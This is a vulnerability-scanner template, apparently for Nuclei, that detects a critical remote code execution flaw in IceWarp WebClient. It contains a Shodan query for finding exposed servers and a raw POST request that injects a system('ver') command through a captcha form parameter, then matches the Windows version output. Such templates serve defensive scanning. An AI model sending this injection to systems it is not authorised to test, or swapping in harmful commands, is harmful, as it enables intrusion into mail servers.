id: icewarp-webclient-rce
info:
  name: IceWarp WebClient - Remote Code Execution
  author: gy741
  severity: critical
  description: The vulnerability icewarp-webclient-rce allows for remote code execution
    in the IceWarp WebClient.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  metadata:
    shodan-query: title:"icewarp"
    impact: The vulnerability in IceWarp WebClient's remote code execution could potentially
      cause significant impact to the system and its users.
    recommendation: It is highly recommended to update IceWarp WebClient immediately
      to avoid the risk of remote code execution.
  tags: icewarp,rce
requests:
- raw:
  - 'POST /webmail/basic/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _dlg[captcha][target]=system(\''ver\'')\

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - Microsoft Windows [Version
  - type: status
    status:
    - 302
